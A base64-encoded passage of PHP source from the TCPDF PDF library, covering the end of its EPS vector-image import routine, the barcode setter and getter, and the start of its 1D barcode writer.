gJGsgKiAoJHcgLyAoKCR4MiAtICR4MSkgLyAkaykpOwoJCX0KCQkvLyBmaXQgdGhlIGltYWdlIG9uIGF2YWlsYWJsZSBzcGFjZQoJCWxpc3QoJHcsICRoLCAkeCwgJHkpID0gJHRoaXMtPmZpdEJsb2NrKCR3LCAkaCwgJHgsICR5LCAkZml0b25wYWdlKTsKCQlpZiAoJHRoaXMtPnJhc3Rlcml6ZV92ZWN0b3JfaW1hZ2VzKSB7CgkJCS8vIGNvbnZlcnQgRVBTIHRvIHJhc3RlciBpbWFnZSB1c2luZyBHRCBvciBJbWFnZU1hZ2ljayBsaWJyYXJpZXMKCQkJcmV0dXJuICR0aGlzLT5JbWFnZSgkZmlsZSwgJHgsICR5LCAkdywgJGgsICdFUFMnLCAkbGluaywgJGFsaWduLCB0cnVlLCAzMDAsICRwYWxpZ24sIGZhbHNlLCBmYWxzZSwgJGJvcmRlciwgZmFsc2UsIGZhbHNlLCAkZml0b25wYWdlKTsKCQl9CgkJLy8gc2V0IHNjYWxpbmcgZmFjdG9ycwoJCSRzY2FsZV94ID0gJHcgLyAoKCR4MiAtICR4MSkgLyAkayk7CgkJJHNjYWxlX3kgPSAkaCAvICgoJHkyIC0gJHkxKSAvICRrKTsKCQkvLyBzZXQgYWxpZ25tZW50CgkJJHRoaXMtPmltZ19yYl95ID0gJHkgKyAkaDsKCQkvLyBzZXQgYWxpZ25tZW50CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJaWYgKCRwYWxpZ24gPT0gJ0wnKSB7CgkJCQkkeGltZyA9ICR0aGlzLT5sTWFyZ2luOwoJCQl9IGVsc2VpZiAoJHBhbGlnbiA9PSAnQycpIHsKCQkJCSR4aW1nID0gKCR0aGlzLT53ICsgJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbiAtICR3KSAvIDI7CgkJCX0gZWxzZWlmICgkcGFsaWduID09ICdSJykgewoJCQkJJHhpbWcgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeGltZyA9ICR4IC0gJHc7CgkJCX0KCQkJJHRoaXMtPmltZ19yYl94ID0gJHhpbWc7CgkJfSBlbHNlIHsKCQkJaWYgKCRwYWxpZ24gPT0gJ0wnKSB7CgkJCQkkeGltZyA9ICR0aGlzLT5sTWFyZ2luOwoJCQl9IGVsc2VpZiAoJHBhbGlnbiA9PSAnQycpIHsKCQkJCSR4aW1nID0gKCR0aGlzLT53ICsgJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbiAtICR3KSAvIDI7CgkJCX0gZWxzZWlmICgkcGFsaWduID09ICdSJykgewoJCQkJJHhpbWcgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeGltZyA9ICR4OwoJCQl9CgkJCSR0aGlzLT5pbWdfcmJfeCA9ICR4aW1nICsgJHc7CgkJfQoJCWlmICgkdXNlQm91bmRpbmdCb3gpIHsKCQkJJGR4ID0gJHhpbWcgKiAkayAtICR4MTsKCQkJJGR5ID0gJHkgKiAkayAtICR5MTsKCQl9IGVsc2UgewoJCQkkZHggPSAkeGltZyAqICRrOwoJCQkkZHkgPSAkeSAqICRrOwoJCX0KCQkvLyBzYXZlIHRoZSBjdXJyZW50IGdyYXBoaWMgc3RhdGUKCQkkdGhpcy0+X291dCgncScuJHRoaXMtPmVwc21hcmtlcik7CgkJLy8gdHJhbnNsYXRlCgkJJHRoaXMtPl9vdXQoc3ByaW50ZignJUYgJUYgJUYgJUYgJUYgJUYgY20nLCAxLCAwLCAwLCAxLCAkZHgsICRkeSArICgkdGhpcy0+aFB0IC0gKDIgKiAkeSAqICRrKSAtICgkeTIgLSAkeTEpKSkpOwoJCS8vIHNjYWxlCgkJJHRoaXMtPl9vdXQoc3ByaW50ZignJUYgJUYgJUYgJUYgJUYgJUYgY20nLCAkc2NhbGVfeCwgMCwgMCwgJHNjYWxlX3ksICR4MSAqICgxIC0gJHNjYWxlX3gpLCAkeTIgKiAoMSAtICRzY2FsZV95KSkpOwoJCS8vIGhhbmRsZSBwYy91bml4L21hYyBsaW5lIGVuZGluZ3MKCQkkbGluZXMgPSBwcmVnX3NwbGl0KCcvW1xyXG5dKy9zaScsICRkYXRhLCAtMSwgUFJFR19TUExJVF9OT19FTVBUWSk7CgkJJHU9MDsKCQkkY250ID0gY291bnQoJGxpbmVzKTsKCQlmb3IgKCRpPTA7ICRpIDwgJGNudDsgKyskaSkgewoJCQkkbGluZSA9ICRsaW5lc1skaV07CgkJCWlmICgoJGxpbmUgPT0gJycpIE9SICgkbGluZVswXSA9PSAnJScpKSB7CgkJCQljb250aW51ZTsKCQkJfQoJCQkkbGVuID0gc3RybGVuKCRsaW5lKTsKCQkJLy8gY2hlY2sgZm9yIHNwb3QgY29sb3IgbmFtZXMKCQkJJGNvbG9yX25hbWUgPSAnJzsKCQkJaWYgKHN0cmNhc2VjbXAoJ3gnLCBzdWJzdHIodHJpbSgkbGluZSksIC0xKSkgPT0gMCkgewoJCQkJaWYgKHByZWdfbWF0Y2goJy9cKFteXCldKlwpLycsICRsaW5lLCAkbWF0Y2hlcykgPiAwKSB7CgkJCQkJLy8gZXh0cmFjdCBzcG90IGNvbG9yIG5hbWUKCQkJCQkkY29sb3JfbmFtZSA9ICRtYXRjaGVzWzBdOwoJCQkJCS8vIHJlbW92ZSBjb2xvciBuYW1lIGZyb20gc3RyaW5nCgkJCQkJJGxpbmUgPSBzdHJfcmVwbGFjZSgnICcuJGNvbG9yX25hbWUsICcnLCAkbGluZSk7CgkJCQkJLy8gcmVtb3ZlIHBoYXJlbnRlc2lzIGZyb20gY29sb3IgbmFtZQoJCQkJCSRjb2xvcl9uYW1lID0gc3Vic3RyKCRjb2xvcl9uYW1lLCAxLCAtMSk7CgkJCQl9CgkJCX0KCQkJJGNodW5rcyA9IGV4cGxvZGUoJyAnLCAkbGluZSk7CgkJCSRjbWQgPSB0cmltKGFycmF5X3BvcCgkY2h1bmtzKSk7CgkJCS8vIFJHQgoJCQlpZiAoKCRjbWQgPT0gJ1hhJykgT1IgKCRjbWQgPT0gJ1hBJykpIHsKCQkJCSRiID0gYXJyYXlfcG9wKCRjaHVua3MpOwoJCQkJJGcgPSBhcnJheV9wb3AoJGNodW5rcyk7CgkJCQkkciA9IGFycmF5X3BvcCgkY2h1bmtzKTsKCQkJCSR0aGlzLT5fb3V0KCcnLiRyLicgJy4kZy4nICcuJGIuJyAnLigkY21kPT0nWGEnPydyZyc6J1JHJykpOyAvL3N1YnN0cigkbGluZSwgMCwgLTIpLidyZycgLT4gaW4gRVBTIChBSTgpOiBjIG0geSBrIHIgZyBiIHJnIQoJCQkJY29udGludWU7CgkJCX0KCQkJJHNraXAgPSBmYWxzZTsKCQkJaWYgKCRmaXhvdXR2YWxzKSB7CgkJCQkvLyBjaGVjayBmb3IgdmFsdWVzIG91dHNpZGUgdGhlIGJvdW5kaW5nIGJveAoJCQkJc3dpdGNoICgkY21kKSB7CgkJCQkJY2FzZSAnbSc6CgkJCQkJY2FzZSAnbCc6CgkJCQkJY2FzZSAnTCc6IHsKCQkJCQkJLy8gc2tpcCB2YWx1ZXMgb3V0c2lkZSBib3VuZGluZyBib3gKCQkJCQkJZm9yZWFjaCAoJGNodW5rcyBhcyAka2V5ID0+ICR2YWwpIHsKCQkJCQkJCWlmICgoKCRrZXkgJSAyKSA9PSAwKSBBTkQgKCgkdmFsIDwgJHgxKSBPUiAoJHZhbCA+ICR4MikpKSB7CgkJCQkJCQkJJHNraXAgPSB0cnVlOwoJCQkJCQkJfSBlbHNlaWYgKCgoJGtleSAlIDIpICE9IDApIEFORCAoKCR2YWwgPCAkeTEpIE9SICgkdmFsID4gJHkyKSkpIHsKCQkJCQkJCQkkc2tpcCA9IHRydWU7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCX0KCQkJc3dpdGNoICgkY21kKSB7CgkJCQljYXNlICdtJzoKCQkJCWNhc2UgJ2wnOgoJCQkJY2FzZSAndic6CgkJCQljYXNlICd5JzoKCQkJCWNhc2UgJ2MnOgoJCQkJY2FzZSAnayc6CgkJCQljYXNlICdLJzoKCQkJCWNhc2UgJ2cnOgoJCQkJY2FzZSAnRyc6CgkJCQljYXNlICdzJzoKCQkJCWNhc2UgJ1MnOgoJCQkJY2FzZSAnSic6CgkJCQljYXNlICdqJzoKCQkJCWNhc2UgJ3cnOgoJCQkJY2FzZSAnTSc6CgkJCQljYXNlICdkJzoKCQkJCWNhc2UgJ24nOiB7CgkJCQkJaWYgKCRza2lwKSB7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQkkdGhpcy0+X291dCgkbGluZSk7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICd4Jzogey8vIGN1c3RvbSBmaWxsIGNvbG9yCgkJCQkJaWYgKGVtcHR5KCRjb2xvcl9uYW1lKSkgewoJCQkJCQkvLyBDTVlLIGNvbG9yCgkJCQkJCWxpc3QoJGNvbF9jLCAkY29sX20sICRjb2xfeSwgJGNvbF9rKSA9ICRjaHVua3M7CgkJCQkJCSR0aGlzLT5fb3V0KCcnLiRjb2xfYy4nICcuJGNvbF9tLicgJy4kY29sX3kuJyAnLiRjb2xfay4nIGsnKTsKCQkJCQl9IGVsc2UgewoJCQkJCQkvLyBTcG90IENvbG9yIChDTVlLICsgdGludCkKCQkJCQkJbGlzdCgkY29sX2MsICRjb2xfbSwgJGNvbF95LCAkY29sX2ssICRjb2xfdCkgPSAkY2h1bmtzOwoJCQkJCQkkdGhpcy0+QWRkU3BvdENvbG9yKCRjb2xvcl9uYW1lLCAoJGNvbF9jICogMTAwKSwgKCRjb2xfbSAqIDEwMCksICgkY29sX3kgKiAxMDApLCAoJGNvbF9rICogMTAwKSk7CgkJCQkJCSRjb2xvcl9jbWQgPSBzcHJpbnRmKCcvQ1MlZCBjcyAlRiBzY24nLCAkdGhpcy0+c3BvdF9jb2xvcnNbJGNvbG9yX25hbWVdWydpJ10sICgxIC0gJGNvbF90KSk7CgkJCQkJCSR0aGlzLT5fb3V0KCRjb2xvcl9jbWQpOwoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ1gnOiB7IC8vIGN1c3RvbSBzdHJva2UgY29sb3IKCQkJCQlpZiAoZW1wdHkoJGNvbG9yX25hbWUpKSB7CgkJCQkJCS8vIENNWUsgY29sb3IKCQkJCQkJbGlzdCgkY29sX2MsICRjb2xfbSwgJGNvbF95LCAkY29sX2spID0gJGNodW5rczsKCQkJCQkJJHRoaXMtPl9vdXQoJycuJGNvbF9jLicgJy4kY29sX20uJyAnLiRjb2xfeS4nICcuJGNvbF9rLicgSycpOwoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIFNwb3QgQ29sb3IgKENNWUsgKyB0aW50KQoJCQkJCQlsaXN0KCRjb2xfYywgJGNvbF9tLCAkY29sX3ksICRjb2xfaywgJGNvbF90KSA9ICRjaHVua3M7CgkJCQkJCSR0aGlzLT5BZGRTcG90Q29sb3IoJGNvbG9yX25hbWUsICgkY29sX2MgKiAxMDApLCAoJGNvbF9tICogMTAwKSwgKCRjb2xfeSAqIDEwMCksICgkY29sX2sgKiAxMDApKTsKCQkJCQkJJGNvbG9yX2NtZCA9IHNwcmludGYoJy9DUyVkIENTICVGIFNDTicsICR0aGlzLT5zcG90X2NvbG9yc1skY29sb3JfbmFtZV1bJ2knXSwgKDEgLSAkY29sX3QpKTsKCQkJCQkJJHRoaXMtPl9vdXQoJGNvbG9yX2NtZCk7CgkJCQkJfQoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnWSc6CgkJCQljYXNlICdOJzoKCQkJCWNhc2UgJ1YnOgoJCQkJY2FzZSAnTCc6CgkJCQljYXNlICdDJzogewoJCQkJCWlmICgkc2tpcCkgewoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJJGxpbmVbKCRsZW4gLSAxKV0gPSBzdHJ0b2xvd2VyKCRjbWQpOwoJCQkJCSR0aGlzLT5fb3V0KCRsaW5lKTsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ2InOgoJCQkJY2FzZSAnQic6IHsKCQkJCQkkdGhpcy0+X291dCgkY21kIC4gJyonKTsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ2YnOgoJCQkJY2FzZSAnRic6IHsKCQkJCQlpZiAoJHUgPiAwKSB7CgkJCQkJCSRpc1UgPSBmYWxzZTsKCQkJCQkJJG1heCA9IG1pbigoJGkgKyA1KSwgJGNudCk7CgkJCQkJCWZvciAoJGogPSAoJGkgKyAxKTsgJGogPCAkbWF4OyArKyRqKSB7CgkJCQkJCQkkaXNVID0gKCRpc1UgT1IgKCgkbGluZXNbJGpdID09ICdVJykgT1IgKCRsaW5lc1skal0gPT0gJypVJykpKTsKCQkJCQkJfQoJCQkJCQlpZiAoJGlzVSkgewoJCQkJCQkJJHRoaXMtPl9vdXQoJ2YqJyk7CgkJCQkJCX0KCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhpcy0+X291dCgnZionKTsKCQkJCQl9CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICcqdSc6IHsKCQkJCQkrKyR1OwoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnKlUnOiB7CgkJCQkJLS0kdTsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCX0KCQkvLyByZXN0b3JlIHByZXZpb3VzIGdyYXBoaWMgc3RhdGUKCQkkdGhpcy0+X291dCgkdGhpcy0+ZXBzbWFya2VyLidRJyk7CgkJaWYgKCFlbXB0eSgkYm9yZGVyKSkgewoJCQkkYnggPSAkdGhpcy0+eDsKCQkJJGJ5ID0gJHRoaXMtPnk7CgkJCSR0aGlzLT54ID0gJHhpbWc7CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkdGhpcy0+eCArPSAkdzsKCQkJfQoJCQkkdGhpcy0+eSA9ICR5OwoJCQkkdGhpcy0+Q2VsbCgkdywgJGgsICcnLCAkYm9yZGVyLCAwLCAnJywgMCwgJycsIDAsIHRydWUpOwoJCQkkdGhpcy0+eCA9ICRieDsKCQkJJHRoaXMtPnkgPSAkYnk7CgkJfQoJCWlmICgkbGluaykgewoJCQkkdGhpcy0+TGluaygkeGltZywgJHksICR3LCAkaCwgJGxpbmssIDApOwoJCX0KCQkvLyBzZXQgcG9pbnRlciB0byBhbGlnbiB0aGUgbmV4dCB0ZXh0L29iamVjdHMKCQlzd2l0Y2goJGFsaWduKSB7CgkJCWNhc2UgJ1QnOnsKCQkJCSR0aGlzLT55ID0gJHk7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ00nOnsKCQkJCSR0aGlzLT55ID0gJHkgKyByb3VuZCgkaC8yKTsKCQkJCSR0aGlzLT54ID0gJHRoaXMtPmltZ19yYl94OwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnQic6ewoJCQkJJHRoaXMtPnkgPSAkdGhpcy0+aW1nX3JiX3k7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ04nOnsKCQkJCSR0aGlzLT5zZXRZKCR0aGlzLT5pbWdfcmJfeSk7CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OnsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5lbmRsaW5leCA9ICR0aGlzLT5pbWdfcmJfeDsKCX0KCgkvKioKCSAqIFNldCBkb2N1bWVudCBiYXJjb2RlLgoJICogQHBhcmFtIHN0cmluZyAkYmMgYmFyY29kZQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0QmFyY29kZSgkYmM9JycpIHsKCQkkdGhpcy0+YmFyY29kZSA9ICRiYzsKCX0KCgkvKioKCSAqIEdldCBjdXJyZW50IGJhcmNvZGUuCgkgKiBAcmV0dXJuIHN0cmluZwoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuMC4wMTIgKDIwMDgtMDctMjQpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRCYXJjb2RlKCkgewoJCXJldHVybiAkdGhpcy0+YmFyY29kZTsKCX0KCgkvKioKCSAqIFByaW50IGEgTGluZWFyIEJhcmNvZGUuCgkgKiBAcGFyYW0gc3RyaW5nICRjb2RlIGNvZGUgdG8gcHJpbnQKCSAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgdHlwZSBvZiBiYXJjb2RlIChzZWUgdGNwZGZfYmFyY29kZXNfMWQucGhwIGZvciBzdXBwb3J0ZWQgZm9ybWF0cykuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCB4IHBvc2l0aW9uIGluIHVzZXIgdW5pdHMgKG51bGwgPSBjdXJyZW50IHggcG9zaXRpb24pCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeSB5IHBvc2l0aW9uIGluIHVzZXIgdW5pdHMgKG51bGwgPSBjdXJyZW50IHkgcG9zaXRpb24pCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkdyB3aWR0aCBpbiB1c2VyIHVuaXRzIChudWxsID0gcmVtYWluaW5nIHBhZ2Ugd2lkdGgpCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkaCBoZWlnaHQgaW4gdXNlciB1bml0cyAobnVsbCA9IHJlbWFpbmluZyBwYWdlIGhlaWdodCkKCSAqIEBwYXJhbSBmbG9hdHxudWxsICR4cmVzIHdpZHRoIG9mIHRoZSBzbWFsbGVzdCBiYXIgaW4gdXNlciB1bml0cyAobnVsbCA9IGRlZmF1bHQgdmFsdWUgPSAwLjRtbSkKCSAqIEBwYXJhbSBhcnJheSAkc3R5bGUgYXJyYXkgb2Ygb3B0aW9uczo8dWw+CgkgKiA8bGk+Ym9vbGVhbiAkc3R5bGVbJ2JvcmRlciddIGlmIHRydWUgcHJpbnRzIGEgYm9yZGVyPC9saT4KCSAqIDxsaT5pbnQgJHN0eWxlWydwYWRkaW5nJ10gcGFkZGluZyB0byBsZWF2ZSBhcm91bmQgdGhlIGJhcmNvZGUgaW4gdXNlciB1bml0cyAoc2V0IHRvICdhdXRvJyBmb3IgYXV0b21hdGljIHBhZGRpbmcpPC9saT4KCSAqIDxsaT5pbnQgJHN0eWxlWydocGFkZGluZyddIGhvcml6b250YWwgcGFkZGluZyBpbiB1c2VyIHVuaXRzIChzZXQgdG8gJ2F1dG8nIGZvciBhdXRvbWF0aWMgcGFkZGluZyk8L2xpPgoJICogPGxpPmludCAkc3R5bGVbJ3ZwYWRkaW5nJ10gdmVydGljYWwgcGFkZGluZyBpbiB1c2VyIHVuaXRzIChzZXQgdG8gJ2F1dG8nIGZvciBhdXRvbWF0aWMgcGFkZGluZyk8L2xpPgoJICogPGxpPmFycmF5ICRzdHlsZVsnZmdjb2xvciddIGNvbG9yIGFycmF5IGZvciBiYXJzIGFuZCB0ZXh0PC9saT4KCSAqIDxsaT5taXhlZCAkc3R5bGVbJ2JnY29sb3InXSBjb2xvciBhcnJheSBmb3IgYmFja2dyb3VuZCAoc2V0IHRvIGZhbHNlIGZvciB0cmFuc3BhcmVudCk8L2xpPgoJICogPGxpPmJvb2xlYW4gJHN0eWxlWyd0ZXh0J10gaWYgdHJ1ZSBwcmludHMgdGV4dCBiZWxvdyB0aGUgYmFyY29kZTwvbGk+CgkgKiA8bGk+c3RyaW5nICRzdHlsZVsnbGFiZWwnXSBvdmVycmlkZSBkZWZhdWx0IGxhYmVsPC9saT4KCSAqIDxsaT5zdHJpbmcgJHN0eWxlWydmb250J10gZm9udCBuYW1lIGZvciB0ZXh0PC9saT48bGk+aW50ICRzdHlsZVsnZm9udHNpemUnXSBmb250IHNpemUgZm9yIHRleHQ8L2xpPgoJICogPGxpPmludCAkc3R5bGVbJ3N0cmV0Y2h0ZXh0J106IDAgPSBkaXNhYmxlZDsgMSA9IGhvcml6b250YWwgc2NhbGluZyBvbmx5IGlmIG5lY2Vzc2FyeTsgMiA9IGZvcmNlZCBob3Jpem9udGFsIHNjYWxpbmc7IDMgPSBjaGFyYWN0ZXIgc3BhY2luZyBvbmx5IGlmIG5lY2Vzc2FyeTsgNCA9IGZvcmNlZCBjaGFyYWN0ZXIgc3BhY2luZy48L2xpPgoJICogPGxpPnN0cmluZyAkc3R5bGVbJ3Bvc2l0aW9uJ10gaG9yaXpvbnRhbCBwb3NpdGlvbiBvZiB0aGUgY29udGFpbmluZyBiYXJjb2RlIGNlbGwgb24gdGhlIHBhZ2U6IEwgPSBsZWZ0IG1hcmdpbjsgQyA9IGNlbnRlcjsgUiA9IHJpZ2h0IG1hcmdpbi48L2xpPgoJICogPGxpPnN0cmluZyAkc3R5bGVbJ2FsaWduJ10gaG9yaXpvbnRhbCBwb3NpdGlvbiBvZiB0aGUgYmFyY29kZSBvbiB0aGUgY29udGFpbmluZyByZWN0YW5nbGU6IEwgPSBsZWZ0OyBDID0gY2VudGVyOyBSID0gcmlnaHQuPC9saT4KCSAqIDxsaT5zdHJpbmcgJHN0eWxlWydzdHJldGNoJ10gaWYgdHJ1ZSBzdHJldGNoIHRoZSBiYXJjb2RlIHRvIGJlc3QgZml0IHRoZSBhdmFpbGFibGUgd2lkdGgsIG90aGVyd2lzZSB1c2VzICR4cmVzIHJlc29sdXRpb24gZm9yIGEgc2luZ2xlIGJhci48L2xpPgoJICogPGxpPnN0cmluZyAkc3R5bGVbJ2ZpdHdpZHRoJ10gaWYgdHJ1ZSByZWR1Y2UgdGhlIHdpZHRoIHRvIGZpdCB0aGUgYmFyY29kZSB3aWR0aCArIHBhZGRpbmcuIFdoZW4gdGhpcyBvcHRpb24gaXMgZW5hYmxlZCB0aGUgJ3N0cmV0Y2gnIG9wdGlvbiBpcyBhdXRvbWF0aWNhbGx5IGRpc2FibGVkLjwvbGk+CgkgKiA8bGk+c3RyaW5nICRzdHlsZVsnY2VsbGZpdGFsaWduJ10gdGhpcyBvcHRpb24gd29ya3Mgb25seSB3aGVuICdmaXR3aWR0aCcgaXMgdHJ1ZSBhbmQgJ3Bvc2l0aW9uJyBpcyB1bnNldCBvciBlbXB0eS4gU2V0IHRoZSBob3Jpem9udGFsIHBvc2l0aW9uIG9mIHRoZSBjb250YWluaW5nIGJhcmNvZGUgY2VsbCBpbnNpZGUgdGhlIHNwZWNpZmllZCByZWN0YW5nbGU6IEwgPSBsZWZ0OyBDID0gY2VudGVyOyBSID0gcmlnaHQuPC9saT48L3VsPgoJICogQHBhcmFtIHN0cmluZyAkYWxpZ24gSW5kaWNhdGVzIHRoZSBhbGlnbm1lbnQgb2YgdGhlIHBvaW50ZXIgbmV4dCB0byBiYXJjb2RlIGluc2VydGlvbiByZWxhdGl2ZSB0byBiYXJjb2RlIGhlaWdodC4gVGhlIHZhbHVlIGNhbiBiZTo8dWw+PGxpPlQ6IHRvcC1yaWdodCBmb3IgTFRSIG9yIHRvcC1sZWZ0IGZvciBSVEw8L2xpPjxsaT5NOiBtaWRkbGUtcmlnaHQgZm9yIExUUiBvciBtaWRkbGUtbGVmdCBmb3IgUlRMPC9saT48bGk+QjogYm90dG9tLXJpZ2h0IGZvciBMVFIgb3IgYm90dG9tLWxlZnQgZm9yIFJUTDwvbGk+PGxpPk46IG5leHQgbGluZTwvbGk+PC91bD4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHdyaXRlMURCYXJjb2RlKCRjb2RlLCAkdHlwZSwgJHg9bnVsbCwgJHk9bnVsbCwgJHc9bnVsbCwgJGg9bnVsbCwgJHhyZXM9bnVsbCwgJHN0eWxlPWFycmF5KCksICRhbGlnbj0nJykgewoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZyh0cmltKCRjb2RlKSkpIHsKCQkJcmV0dXJuOwoJCX0KCQlyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuJy90Y3BkZl9iYXJjb2Rlc18xZC5waHAnKTsKCQkvLyBzYXZlIGN1cnJlbnQgZ3JhcGhpYyBzZXR0aW5ncwoJCSRndmFycyA9ICR0aGlzLT5nZXRHcmFwaGljVmFycygpOwoJCS8vIGNyZWF0ZSBuZXcgYmFyY29kZSBvYmplY3QKCQkkYmFyY29kZW9iaiA9IG5ldyBUQ1BERkJhcmNvZGUoJGNvZGUsICR0eXBlKTsKCQkkYXJyY29kZSA9ICRiYXJjb2Rlb2JqLT5nZXRCYXJjb2RlQXJyYXkoKTsKCQlpZiAoZW1wdHkoJGFycmNvZGUpIE9SICgkYXJyY29kZVsnbWF4dyddIDw9IDApKSB7CgkJCSR0aGlzLT5FcnJvcignRXJyb3IgaW4gMUQgYmFyY29kZSBzdHJpbmcnKTsKCQl9CgkJaWYgKCRhcnJjb2RlWydtYXhoJ10gPD0gMCkgewoJCQkkYXJyY29kZVsnbWF4aCddID0gMTsKCQl9CgkJLy8gc2V0IGRlZmF1bHQgdmFsdWVzCgkJaWYgKCFpc3NldCgkc3R5bGVbJ3Bvc2l0aW9uJ10pKSB7CgkJCSRzdHlsZVsncG9zaXRpb24nXSA9ICcnOwoJCX0gZWxzZWlmICgkc3R5bGVbJ3Bvc2l0aW9uJ10gPT0gJ1MnKSB7CgkJCS8vIGtlZXAgdGhpcyBmb3IgYmFja3dhcmQgY29tcGF0aWJpbGl0eQoJCQkkc3R5bGVbJ3Bvc2l0aW9uJ10gPSAnJzsKCQkJJHN0eWxlWydzdHJldGNoJ10gPSB0cnVlOwoJCX0KCQlpZiAoIWlzc2V0KCRzdHlsZVsnZml0d2lkdGgnXSkpIHsKCQkJaWYgKCFpc3NldCgkc3R5bGVbJ3N0cmV0Y2gnXSkpIHsKCQkJCSRzdHlsZVsnZml0d2lkdGgnXSA9IHRydWU7CgkJCX0gZWxzZSB7CgkJCQkkc3R5bGVbJ2ZpdHdpZHRoJ10gPSBmYWxzZTsKCQkJfQoJCX0KCQlpZiAoJHN0eWxlWydmaXR3aWR0aCddKSB7CgkJCS8vIGRpc2FibGUgc3RyZXRjaAoJCQkkc3R5bGVbJ3N0cmV0Y2gnXSA9IGZhbHNlOwoJCX0KCQlpZiAoIWlzc2V0KCRzdHlsZVsnc3RyZXRjaCddKSkgewoJCQlpZiAoKCR3ID09PSAnJykgT1IgKCR3IDw9IDApKSB7CgkJCQkkc3R5bGVbJ3N0cmV0Y2gnXSA9IGZhbHNlOwoJCQl9IGVsc2UgewoJCQkJJHN0eWxlWydzdHJldGNoJ10gPSB0cnVlOwoJCQl9CgkJfQoJCWlmICghaXNzZXQoJHN0eWxlWydmZ2NvbG9yJ10pKSB7CgkJCSRzdHlsZVsnZmdjb2xvciddID0gYXJyYXkoMCwwLDApOyAvLyBkZWZhdWx0IGJsYWNrCgkJfQoJCWlmICghaXNzZXQoJHN0eWxlWydiZ2NvbG9yJ10pKSB7CgkJCSRzdHlsZVsnYmdjb2xvciddID0gZmFsc2U7IC8vIGRlZmF1bHQgdHJhbnNwYXJlbnQKCQl9CgkJaWYgKCFpc3NldCgkc3R5bGVbJ2JvcmRlciddKSkgewoJCQkkc3R5bGVbJ2JvcmRlciddID0gZmFsc2U7CgkJfQoJCSRmb250c2l6ZSA9IDA7CgkJaWYgKCFpc3NldCgkc3R5bGVbJ3RleHQnXSkpIHsKCQkJJHN0eWxlWyd0ZXh0J10gPSBmYWxzZTsKCQl9CgkJaWYgKCRzdHlsZVsndGV4dCddIEFORCBpc3NldCgkc3R5bGVbJ2ZvbnQnXSkpIHsKCQkJaWYgKGlzc2V0KCRzdHlsZVsnZm9udHNpemUnXSkpIHsKCQkJCSRmb250c2l6ZSA9ICRzdHlsZVsnZm9udHNpemUnXTsKCQkJfQoJCQkkdGhpcy0+c2V0Rm9udCgkc3R5bGVbJ2ZvbnQnXSwgJycsICRmb250c2l6ZSk7CgkJfQoJCWlmICghaXNzZXQoJHN0eWxlWydzdHJldGNodGV4dCddKSkgewoJCQkkc3R5bGVbJ3N0cmV0Y2h0ZXh0J10gPSA0OwoJCX0KCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHgsICR5KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpOwoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdykgT1IgKCR3IDw9IDApKSB7CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkdyA9ICR4IC0gJHRoaXMtPmxNYXJnaW47CgkJCX0gZWxzZSB7CgkJCQkkdyA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkeDsKCQkJfQoJCX0KCQkvLyBwYWRkaW5nCgkJaWYgKCFpc3NldCgkc3R5bGVbJ3BhZGRpbmcnXSkpIHsKCQkJJHBhZGRpbmcgPSAwOwoJCX0gZWxzZWlmICgkc3R5bGVbJ